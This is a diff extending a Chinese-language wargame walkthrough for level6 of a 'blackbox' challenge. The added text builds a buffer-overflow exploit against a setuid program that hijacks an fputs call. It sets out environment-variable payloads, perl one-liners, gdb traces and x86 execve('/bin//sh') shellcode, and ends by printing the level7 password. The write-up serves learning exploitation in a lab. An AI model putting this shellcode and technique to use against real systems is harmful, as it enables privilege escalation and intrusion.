@@ -205,8 +205,9 @@ Program received signal SIGSEGV, Segmentation fault.
 
 3. 根据：
 <fputs+113>: movsbl 0x46(%esi),%eax   /* eax = (esi + 70) */
-<fputs+120>: mov    0x94(%esi,%eax,1),%eax /* eax = (esi + eax * 1) + 148 */
-<fputs+141>: call   *0x1c(%eax) /* call ((eax) + 0x28) */
+<fputs+120>: mov    0x94(%esi,%eax,1),%eax /* eax = (esi + eax * 1 + 148 ) */
+<fputs+141>: call   *0x1c(%eax) /* call (eax + 0x28) */
+
 
 
 
@@ -222,3 +223,41 @@ PAYLOAD is at 0xbfffdfe7
 (gdb)  r $(perl -e 'print "A"x(1041)."\xe7\xdf\xff\xbf"')
 (gdb) x/x $esi
 0xbfffdfe7:     0x41418041  
+
+$export PAYLOAD=$'\x41\x80\x41\x41'   (\x80是为了第一个条件，and    $0x8000,%eax 之后不为0)
+
+$export JUNK=$(perl -e 'print "\x41\x80\x41\x41"."A"x(17)."BBBB"."C"x(45)."\x81"')
+"\x81"位于(esi+70)处，其整数值为(-127),根据3中的(
+	<fputs+120>: mov    0x94(%esi,%eax,1),%eax /* eax = (esi + eax * 1 + 148)  */
+) 这个条件计算后得到 eax = (esi + -127 * 1 + 148) = *(esi + 21) = "BBBB"
+
+export SC=$(perl -e 'print "A"x(28)."CCCC"')
+我们将JUNK中的"BBBB"换成SC的地址，执行后得到：
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+表明在"CCCC"处我们需要填入真正的shellcode的地址。
+
+最后：
+export CODE=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
+export SC=$(perl -e 'print "A"x(28)."CCCC"')    (CODE地址替换"CCCC")
+export JUNK=$(perl -e 'print "\x41\x80\x41\x41"."A"x(17)."BBBB"."C"x(45)."\x81"')  (SC地址替换"BBBB")
+r $(perl -e 'print "A"x(1041)."DDDD"') (JUNK地址替换"DDDD")
+
+替换之后：
+level6@blackbox:/tmp/level6$ ./env CODE
+CODE is at 0xbfffdfcb
+level6@blackbox:/tmp/level6$ export SC=$(perl -e 'print "A"x(28)."\xcb\xdf\xff\xbf"') 
+level6@blackbox:/tmp/level6$ ./env SC  
+SC is at 0xbfffdf49
+level6@blackbox:/tmp/level6$ export JUNK=$(perl -e 'print "\x41\x80\x41\x41"."A"x(17)."\x49\xdf\xff\xbf"."C"x(45)."\x81"')  
+level6@blackbox:/tmp/level6$ ./env JUNK
+JUNK is at 0xbfffdefe
+level6@blackbox:/tmp/level6$ cd /home/level6
+level6@blackbox:~$ ./fsp $(perl -e 'print "A"x(1041)."\xfe\xde\xff\xbf"')
+level7@blackbox:/home/level6$ cd /home/level7
+level7@blackbox:/home/level7$ cat passwd 
+$m4shitup
+level7@blackbox:/home/level7$
